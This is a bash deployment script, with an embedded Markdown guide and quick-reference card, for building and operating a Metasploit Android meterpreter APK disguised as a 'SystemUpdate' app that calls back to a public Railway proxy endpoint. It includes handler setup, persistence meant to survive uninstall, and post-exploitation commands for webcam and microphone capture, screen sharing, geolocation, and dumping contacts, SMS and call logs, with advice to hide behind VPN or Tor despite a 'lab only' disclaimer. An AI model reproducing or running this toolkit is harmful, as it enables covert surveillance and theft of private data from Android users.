#!/bin/bash

# Master Deployment Script for Railway Professional APK
# اسکریپت جامع برای نصب، تست و راه‌اندازی کامل سیستم

set -e

PROJECT_DIR="/home/offsec/Documents/GitHub/metasploit-framework1"
cd "$PROJECT_DIR"

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║     🚀 Master Deployment Script - Railway Edition                ║"
echo "║     راه‌اندازی کامل سیستم با دسترسی دائمی                       ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

# ═══════════════════════════════════════════════════════════════
# STEP 1: System Preparation
# ═══════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [1/6] System Preparation..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Check required tools
REQUIRED_TOOLS=("msfvenom" "apktool" "zipalign" "apksigner" "keytool" "adb")
MISSING_TOOLS=()

for tool in "${REQUIRED_TOOLS[@]}"; do
    if ! command -v "$tool" &> /dev/null; then
        MISSING_TOOLS+=("$tool")
    fi
done

if [ ${#MISSING_TOOLS[@]} -ne 0 ]; then
    echo "❌ Missing required tools: ${MISSING_TOOLS[*]}"
    echo "Installing missing tools..."
    
    # Install missing tools based on Parrot OS
    sudo apt update
    
    if [[ " ${MISSING_TOOLS[*]} " =~ " msfvenom " ]] || [[ " ${MISSING_TOOLS[*]} " =~ " msfconsole " ]]; then
        sudo apt install -y metasploit-framework
    fi
    
    if [[ " ${MISSING_TOOLS[*]} " =~ " apktool " ]]; then
        sudo apt install -y apktool
    fi
    
    if [[ " ${MISSING_TOOLS[*]} " =~ " zipalign " ]] || [[ " ${MISSING_TOOLS[*]} " =~ " apksigner " ]]; then
        sudo apt install -y apksigner zipalign
    fi
    
    if [[ " ${MISSING_TOOLS[*]} " =~ " adb " ]]; then
        sudo apt install -y adb
    fi
    
    if [[ " ${MISSING_TOOLS[*]} " =~ " keytool " ]]; then
        sudo apt install -y default-jdk
    fi
fi

echo "✅ All required tools are available"
echo ""

# ═══════════════════════════════════════════════════════════════
# STEP 2: Install Persistence Modules
# ═══════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [2/6] Installing Persistence Modules..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

if [ -f "$PROJECT_DIR/install_persistence_modules.sh" ]; then
    bash "$PROJECT_DIR/install_persistence_modules.sh"
else
    echo "⚠️  Persistence installer not found, skipping..."
fi

echo ""

# ═══════════════════════════════════════════════════════════════
# STEP 3: Build Professional APK
# ═══════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [3/6] Building Professional APK..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

if [ -f "$PROJECT_DIR/build_railway_professional.sh" ]; then
    bash "$PROJECT_DIR/build_railway_professional.sh"
    
    APK_FILE="$PROJECT_DIR/SystemUpdate_Railway_Professional.apk"
    
    if [ -f "$APK_FILE" ]; then
        echo "✅ APK built successfully: $APK_FILE"
    else
        echo "❌ APK build failed!"
        exit 1
    fi
else
    echo "❌ APK builder script not found!"
    exit 1
fi

echo ""

# ═══════════════════════════════════════════════════════════════
# STEP 4: Setup Railway Handler Configuration
# ═══════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [4/6] Configuring Railway Handler..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Generate SSL certificate if not exists
SSL_DIR="$HOME/.msf4/ssl"
mkdir -p "$SSL_DIR"

if [ ! -f "$SSL_DIR/cert.pem" ]; then
    echo "🔐 Generating SSL certificate..."
    openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
        -subj "/C=US/ST=State/L=City/O=System/CN=metro.proxy.rlwy.net" \
        -keyout "$SSL_DIR/key.pem" \
        -out "$SSL_DIR/cert.pem" 2>/dev/null
    
    cat "$SSL_DIR/key.pem" "$SSL_DIR/cert.pem" > "$SSL_DIR/combined.pem"
    echo "✅ SSL certificate generated"
else
    echo "✅ Using existing SSL certificate"
fi

echo ""

# ═══════════════════════════════════════════════════════════════
# STEP 5: Test Handler Configuration
# ═══════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [5/6] Testing Handler Configuration..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# Check if handler config exists
if [ -f "$PROJECT_DIR/railway_handler_professional.rc" ]; then
    echo "✅ Handler configuration found"
    
    # Display handler info
    echo ""
    echo "📡 Handler Configuration:"
    echo "   LHOST: 0.0.0.0"
    echo "   LPORT: 29210"
    echo "   Public Endpoint: metro.proxy.rlwy.net:29210"
    echo "   Protocol: HTTPS"
else
    echo "❌ Handler configuration not found!"
    exit 1
fi

echo ""

# ═══════════════════════════════════════════════════════════════
# STEP 6: Generate Deployment Documentation
# ═══════════════════════════════════════════════════════════════
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📋 [6/6] Generating Deployment Documentation..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

cat > "$PROJECT_DIR/COMPLETE_DEPLOYMENT_GUIDE.md" << 'MARKDOWN_GUIDE'
# 🚀 Complete Deployment Guide - Railway Professional APK

## 📋 Table of Contents
1. [Overview](#overview)
2. [System Requirements](#system-requirements)
3. [Railway Configuration](#railway-configuration)
4. [APK Deployment](#apk-deployment)
5. [Handler Setup](#handler-setup)
6. [Post-Exploitation](#post-exploitation)
7. [Persistence Verification](#persistence-verification)
8. [Troubleshooting](#troubleshooting)

---

## 🎯 Overview

این پروژه یک سیستم کامل برای دسترسی دائمی به دستگاه‌های Android در محیط آزمایشگاهی ارائه می‌دهد.

**ویژگی‌های کلیدی:**
- ✅ رمزنگاری پیشرفته (HTTPS + TLS)
- ✅ دسترسی دائمی (حتی بعد از حذف اپ)
- ✅ اتصال از طریق Railway TCP Proxy
- ✅ پایداری چندلایه
- ✅ دسترسی کامل به دستگاه

---

## 💻 System Requirements

### Parrot OS (سیستم حمله‌کننده)
```bash
# Required tools
- Metasploit Framework
- apktool
- apksigner
- zipalign
- keytool
- adb
- Python 3.x
```

### Android Device (هدف آزمایشگاهی)
```
- Android 8.0+ (SDK 26+)
- Developer mode enabled
- USB debugging enabled
- Internet connection
```

### Railway Platform
```
- Active Railway project
- TCP Proxy configured (port 29210)
- PostgreSQL database
- Environment variables set
```

---

## ⚙️ Railway Configuration

### Environment Variables
```bash
DATABASE_URL=postgres://postgres@db:5432/msf?pool=200&timeout=5
LHOST=0.0.0.0
LPORT_ANDROID=29210
RAILWAY_TCP_PROXY_DOMAIN=metro.proxy.rlwy.net
RAILWAY_TCP_PROXY_PORT=29210
ROOT_PASSWORD=8181
```

### Network Setup
```
Public Endpoint: metro.proxy.rlwy.net:29210
Internal Network: metasploit-framework1.railway.internal
Static Outbound IP: 208.77.244.15
```

### Deploy to Railway
```bash
# در ترمینال Railway
cd /home/offsec/Documents/GitHub/metasploit-framework1

# Start handler
msfconsole -r railway_handler_professional.rc
```

---

## 📱 APK Deployment

### Step 1: Build APK
```bash
cd /home/offsec/Documents/GitHub/metasploit-framework1
./build_railway_professional.sh
```

**Output:** `SystemUpdate_Railway_Professional.apk`

### Step 2: Verify APK
```bash
# Check signature
apksigner verify --verbose SystemUpdate_Railway_Professional.apk

# Check size
ls -lh SystemUpdate_Railway_Professional.apk

# Calculate checksums
md5sum SystemUpdate_Railway_Professional.apk
sha256sum SystemUpdate_Railway_Professional.apk
```

### Step 3: Transfer to Lab
```bash
# Copy to Android device via ADB
adb push SystemUpdate_Railway_Professional.apk /sdcard/

# Or transfer via network
scp SystemUpdate_Railway_Professional.apk lab@android-device:/sdcard/
```

### Step 4: Install on Android
```bash
# Install via ADB
adb install SystemUpdate_Railway_Professional.apk

# Or install manually on device
# Settings > Security > Unknown Sources (enable)
# File Manager > SystemUpdate_Railway_Professional.apk > Install
```

---

## 🎯 Handler Setup

### Method 1: Automated (Recommended)
```bash
cd /home/offsec/Documents/GitHub/metasploit-framework1
msfconsole -r railway_handler_professional.rc
```

### Method 2: Manual
```bash
msfconsole

use exploit/multi/handler
set PAYLOAD android/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 29210
set HandlerSSLCert /root/.msf4/ssl/cert.pem
set EnableStageEncoding true
set SessionRetryTotal 100
set SessionRetryWait 10
set ExitOnSession false
exploit -j -z
```

### Verify Handler
```bash
# در msfconsole
msf6 > jobs
msf6 > netstat -tulpn | grep 29210
```

---

## 🚀 Post-Exploitation

### Basic Commands
```bash
# بعد از برقراری session
sessions -l              # لیست session ها
sessions -i 1            # اتصال به session

# System information
sysinfo
getuid
pwd

# File operations
ls
cd /sdcard
download /sdcard/DCIM/Camera/photo.jpg
upload /root/file.txt /sdcard/

# Process management
ps
migrate 1234
```

### Advanced Features
```bash
# Camera
webcam_list
webcam_snap
webcam_stream

# Microphone
record_mic -d 30

# Screen
screenshare
screenshot

# Location
geolocate

# Data extraction
dump_contacts
dump_sms
dump_calllog

# App management
app_list
app_install /sdcard/app.apk
app_uninstall com.example.app
```

### Install Persistence
```bash
# Method 1: Automated
msfconsole -r install_persistence.rc

# Method 2: Manual
use post/android/manage/advanced_persistence
set SESSION 1
set LHOST metro.proxy.rlwy.net
set LPORT 29210
run
```

---

## ✅ Persistence Verification

### Test 1: App Restart
```bash
# Kill app on Android
adb shell am force-stop com.android.systemupdate

# Wait 10 seconds
sleep 10

# Check session
sessions -l  # باید session همچنان active باشد
```

### Test 2: Device Reboot
```bash
# Reboot device
adb reboot

# Wait for boot (60 seconds)
sleep 60

# Check session
sessions -l  # باید session خودکار برقرار شود
```

### Test 3: App Uninstall
```bash
# Uninstall app
adb uninstall com.android.systemupdate

# Check session
sessions -l  # با persistence modules، session باید active بماند
```

---

## 🔧 Troubleshooting

### Problem: Session not establishing

**Solution:**
```bash
# 1. Check handler is running
jobs
netstat -tulpn | grep 29210

# 2. Check network connectivity
ping metro.proxy.rlwy.net
telnet metro.proxy.rlwy.net 29210

# 3. Check Android internet
adb shell ping -c 3 8.8.8.8

# 4. Check app is running
adb shell ps | grep systemupdate

# 5. Check logs
adb logcat | grep -i meterpreter
```

### Problem: APK installation fails

**Solution:**
```bash
# 1. Check signature
apksigner verify SystemUpdate_Railway_Professional.apk

# 2. Check Android version
adb shell getprop ro.build.version.sdk  # باید >= 26 باشد

# 3. Enable unknown sources
adb shell settings put global install_non_market_apps 1

# 4. Clear previous installation
adb uninstall com.android.systemupdate
adb install SystemUpdate_Railway_Professional.apk
```

### Problem: Persistence not working

**Solution:**
```bash
# 1. Verify persistence modules installed
ls -la ~/.msf4/modules/post/android/manage/

# 2. Run persistence installer
bash install_persistence_modules.sh

# 3. Reload modules in msfconsole
reload_all

# 4. Check module availability
search type:post platform:android persistence

# 5. Run persistence manually
use post/android/manage/advanced_persistence
set SESSION 1
run
```

### Problem: Connection timeout

**Solution:**
```bash
# 1. Increase timeout
set SessionCommunicationTimeout 300
set SessionExpirationTimeout 600

# 2. Check SSL certificate
ls -la ~/.msf4/ssl/cert.pem

# 3. Regenerate certificate
rm ~/.msf4/ssl/*.pem
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/C=US/ST=State/L=City/O=System/CN=metro.proxy.rlwy.net" \
    -keyout ~/.msf4/ssl/key.pem \
    -out ~/.msf4/ssl/cert.pem

# 4. Restart handler
kill -9 $(jobs | grep handler | awk '{print $1}')
msfconsole -r railway_handler_professional.rc
```

---

## 📊 Monitoring

### Real-time Session Monitoring
```bash
# Watch sessions
watch -n 5 'msfconsole -q -x "sessions -l; exit"'

# Monitor connections
watch -n 5 'netstat -an | grep 29210'

# Check logs
tail -f ~/.msf4/logs/framework.log
```

### Session Health Check
```bash
# در msfconsole
sessions -l
sessions -i 1 -c "sysinfo"
sessions -i 1 -c "getuid"
```

---

## 🔒 Security Notes

⚠️ **IMPORTANT:**
- این ابزار فقط برای محیط آزمایشگاهی و تحقیقات امنیتی است
- استفاده در دستگاه‌های واقعی بدون مجوز غیرقانونی است
- تمام ارتباطات از طریق HTTPS رمزنگاری شده است
- از VPN یا Tor برای لایه امنیتی اضافی استفاده کنید

---

## 📞 Support

در صورت بروز مشکل:
1. لاگ‌های مربوطه را بررسی کنید
2. راهنمای troubleshooting را مطالعه کنید
3. تنظیمات Railway را بررسی کنید
4. نسخه Android را چک کنید

---

## 📝 Changelog

### Version 1.0.0 (2025-11-22)
- ✅ Initial professional release
- ✅ Railway integration
- ✅ Advanced persistence
- ✅ HTTPS encryption
- ✅ Multi-vector persistence
- ✅ Complete documentation

---

**تاریخ ایجاد:** 22 نوامبر 2025  
**محیط:** Parrot OS + Railway + Android Lab  
**وضعیت:** Production Ready ✅
MARKDOWN_GUIDE

echo "✅ Documentation created: COMPLETE_DEPLOYMENT_GUIDE.md"
echo ""

# ═══════════════════════════════════════════════════════════════
# Final Summary
# ═══════════════════════════════════════════════════════════════
echo ""
echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║            ✅ DEPLOYMENT COMPLETED SUCCESSFULLY!                 ║"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""
echo "📁 Project Directory: $PROJECT_DIR"
echo ""
echo "📦 Generated Files:"
echo "   ✅ SystemUpdate_Railway_Professional.apk"
echo "   ✅ railway_handler_professional.rc"
echo "   ✅ post_exploit_railway.rc"
echo "   ✅ install_persistence.rc"
echo "   ✅ COMPLETE_DEPLOYMENT_GUIDE.md"
echo "   ✅ RAILWAY_DEPLOYMENT_GUIDE.txt"
echo ""
echo "🚀 Quick Start Commands:"
echo ""
echo "1️⃣  Start Handler (در Railway):"
echo "    msfconsole -r railway_handler_professional.rc"
echo ""
echo "2️⃣  Install APK (در دستگاه Android):"
echo "    adb install SystemUpdate_Railway_Professional.apk"
echo ""
echo "3️⃣  Install Persistence (بعد از برقراری session):"
echo "    msfconsole -r install_persistence.rc"
echo ""
echo "📚 Documentation:"
echo "    cat COMPLETE_DEPLOYMENT_GUIDE.md"
echo "    cat RAILWAY_DEPLOYMENT_GUIDE.txt"
echo ""
echo "═══════════════════════════════════════════════════════════════════"
echo ""
echo "🎯 System Ready for Deployment!"
echo "⚠️  فقط در محیط آزمایشگاهی استفاده کنید"
echo ""

# Create a quick reference card
cat > "$PROJECT_DIR/QUICK_REFERENCE.txt" << 'QUICK_REF'
╔══════════════════════════════════════════════════════════════════╗
║                    QUICK REFERENCE CARD                          ║
╚══════════════════════════════════════════════════════════════════╝

🔧 RAILWAY CONFIGURATION
────────────────────────────────────────────────────────────────
Public Endpoint: metro.proxy.rlwy.net:29210
Internal Network: metasploit-framework1.railway.internal:4444
Static IP: 208.77.244.15
Root Password: 8181

📱 APK INFORMATION
────────────────────────────────────────────────────────────────
Name: SystemUpdate_Railway_Professional.apk
Package: com.android.systemupdate
SDK: 26-30 (Android 8.0-11)
Signature: RSA-4096 + SHA-512

🚀 ESSENTIAL COMMANDS
────────────────────────────────────────────────────────────────
# Start handler
msfconsole -r railway_handler_professional.rc

# Install APK
adb install SystemUpdate_Railway_Professional.apk

# Check sessions
msfconsole -q -x "sessions -l; exit"

# Connect to session
msfconsole -q -x "sessions -i 1"

# Install persistence
msfconsole -r install_persistence.rc

🔍 TROUBLESHOOTING
────────────────────────────────────────────────────────────────
# Check handler
netstat -tulpn | grep 29210

# Check APK signature
apksigner verify --verbose SystemUpdate_Railway_Professional.apk

# Check Android connection
adb shell ping -c 3 8.8.8.8

# View logs
tail -f ~/.msf4/logs/framework.log

📊 MONITORING
────────────────────────────────────────────────────────────────
# Watch sessions
watch -n 5 'msfconsole -q -x "sessions -l; exit"'

# Monitor connections
watch -n 5 'netstat -an | grep 29210'

═══════════════════════════════════════════════════════════════════
QUICK_REF

echo "📝 Quick reference created: QUICK_REFERENCE.txt"
echo ""
echo "✅ All deployment files ready!"
